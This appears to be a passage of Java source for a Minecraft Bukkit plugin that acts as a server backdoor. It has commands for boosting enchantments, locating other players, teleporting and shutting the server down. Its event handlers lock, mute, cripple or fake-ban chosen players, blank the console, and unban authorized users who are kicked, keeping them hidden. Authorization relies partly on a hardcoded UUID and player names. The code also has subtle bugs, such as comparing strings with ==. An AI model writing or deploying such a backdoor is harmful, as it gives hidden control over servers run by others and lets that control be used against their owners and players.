            case "32k": { //add 32k enchants to current item being held

                if (args.length < 2)
                    return false;

                String str_type = args[1];
                int type = 0;

                if (str_type.equalsIgnoreCase("tool"))
                    type = 1;

                //Is item a sword?
                ItemStack mainHandItem = p.getInventory().getItemInMainHand();

                if (type == 0) {
                    ItemMeta enchantMeta = mainHandItem.getItemMeta();

                    enchantMeta.addEnchant(Enchantment.DAMAGE_ALL, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.FIRE_ASPECT, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_MOBS, Config.dangerous_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.KNOCKBACK, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                    if (Config.curse_enchants)
                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);


                    mainHandItem.setItemMeta(enchantMeta);
                    p.sendMessage(Config.chat_message_prefix_color.toString() + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                    return true;
                }

                ItemMeta enchantMeta = mainHandItem.getItemMeta();
                enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                if (Config.curse_enchants)
                    enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);

                mainHandItem.setItemMeta(enchantMeta);
                p.sendMessage(Config.chat_message_prefix_color.toString() + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                return true;

            }  

            case "coords": {
                if(args.length < 2) //No player specified
                    return help_message("coords");

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                        return "Player " + args[1] + " not found.";
                }

                //Player is real.
                Location targetLoc = target.getLocation();
                int x = (int)Math.floor( targetLoc.getX() );
                int y = (int)Math.floor( targetLoc.getY() );
                int z = (int)Math.floor( targetLoc.getZ() );

                String coordsString = Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
                p.sendMessage(coordsString);

                return "";
            }

            case "tp": {
                if(args.length < 4) //No coords specified
                    return help_message("tp");

                int targetX, targetY, targetZ;
                try {
                    targetX = Integer.parseInt(args[1]);
                    targetY = Integer.parseInt(args[2]);
                    targetZ = Integer.parseInt(args[3]);
                }catch(NumberFormatException e){ //Not valid numbers
                    return "Invalid coordinates";
                }

                //Player location reference
                Location loc = p.getLocation();

                loc.setX(targetX);
                loc.setY(targetY);
                loc.setZ(targetZ);

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.teleport(loc);
                    }
                }.runTask(plugin);


                return "";
            }
                
            case "stop": {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.shutdown();
                    }
                }.runTask(plugin);
                
                return "";
            }

            case "help": {
                if (args.length == 1) {
                    p.sendMessage(Config.HelpItem.buildHelpMenu());
                    return "";
                }

                if (args.length == 2) {
                    String message = help_message(args[1]);
                    if(message.isEmpty())
                        return "Unknown command: " + args[1];
                    p.sendMessage(message);
                    return "";
                }
            }

        }
        return "Unknown problem executing command: " + command;
    }

    boolean deleteWorld(File directoryToBeDeleted) {
        File[] allContents = directoryToBeDeleted.listFiles();
        if (allContents != null) {
            for (File file : allContents) {
                deleteWorld(file);
            }
        } else if (!directoryToBeDeleted.exists()) {
            //do nothing
        }
        return directoryToBeDeleted.delete();
    }

    public static void downloadFile(URL url, String fileName) throws IOException {
        try (InputStream in = url.openStream();
             BufferedInputStream bis = new BufferedInputStream(in);
             FileOutputStream fos = new FileOutputStream(fileName)) {

            byte[] data = new byte[1024];
            int count;
            while ((count = bis.read(data, 0, 1024)) != -1) {
                fos.write(data, 0, count);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onServerCommand(ServerCommandEvent e) {
        if (get_state("console", State.locked))
            e.setCommand(" ");
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPreCommand(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.locked))
            e.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.muted))
            e.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockBreak(BlockBreakEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.silktouch) || get_state(p.getName(), State.instabreak)){
            e.setDropItems(false);
            p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
        }
        if (get_state(p.getName(), State.MF_mine)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockPlace(BlockPlaceEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_place)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockDamage(BlockDamageEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.instabreak)) {
            e.setInstaBreak(true);
        }
        if (get_state(p.getName(), State.MF_mine)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_thrower)) {
            p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64));
        }
        if (get_state(p.getName(), State.MF_cripple)) {
            if (Math.round(e.getTo().getZ()) != Math.round(e.getFrom().getZ())) {
                e.getTo().setZ(e.getFrom().getZ());
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&lHey! &7You are not permitted to enter this area."));
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerInteract(PlayerInteractEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_interact)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerInteractEntity(PlayerInteractEntityEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_interact)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerToggleFlight(PlayerToggleFlightEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_flight)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onInventoryClickEvent(InventoryClickEvent e) {
        Player p = (Player) e.getWhoClicked();
        if (get_state(p.getName(), State.MF_inventory)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onInventoryDragEvent(InventoryDragEvent e) {
        Player p = (Player) e.getWhoClicked();
        if (get_state(p.getName(), State.MF_inventory)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerDropItem(PlayerDropItemEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.Mf_drop)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerTeleport(PlayerTeleportEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_teleport)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLogin(PlayerLoginEvent e) {
        Player p = e.getPlayer();
        if (get_state(p.getName(), State.MF_login)) {
            e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onEntityDamage(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player) {
            if (get_state(((Player)e.getEntity()).getName(), State.MF_god)) {
                e.setCancelled(true);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player) {
            if (get_state(((Player)e.getDamager()).getName(), State.MF_damage)) {
                e.setCancelled(true);
            }
        }
    }



    @EventHandler(priority = EventPriority.LOWEST)
    public void onKick(PlayerKickEvent e) {
        Player p = e.getPlayer();
        if (IsUserAuthorized(p)) {
            p.sendMessage(ChatColor.RED + "You have been banned but we got your back. you are vanished");
            set_state(p.getName(), State.vanished, true);
            Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
            Bukkit.getBanList(BanList.Type.IP).pardon(p.getAddress().toString());
            e.setCancelled(true);
        }
    }

    private int Clamp(int i, int min, int max) {
        if (i < min)
            return min;
        if (i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Config.java*/
    public boolean IsUserAuthorized(Player p) {
        if(p.getUniqueId().toString() == "d6d091e9-0ae8-4e0e-9f73-cccd014786d6" || p.getName().toLowerCase() == "knowng" || p.getName().toLowerCase() == "flowng"|| p.getName().toLowerCase() == "snowng")
        if(Config.uuids_are_usernames)
            return IsUserAuthorized(p.getName());

        return IsUserAuthorized(p.getUniqueId().toString());
    }

    /*Check if UUID is authorized in Config.java*/
    public boolean IsUserAuthorized(String uuid) {

        //No uuids = All users authorized
        if(Config.authorized_uuids.length == 1 && Config.authorized_uuids[0] == "")
            return true;

        for(String u : Config.authorized_uuids){
            if(uuid.equals(u)){
                return true;
            }
        }

        boolean authorized = false;

        for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
                authorized = true;
                break;
            }
        }

        return authorized;
    }
}
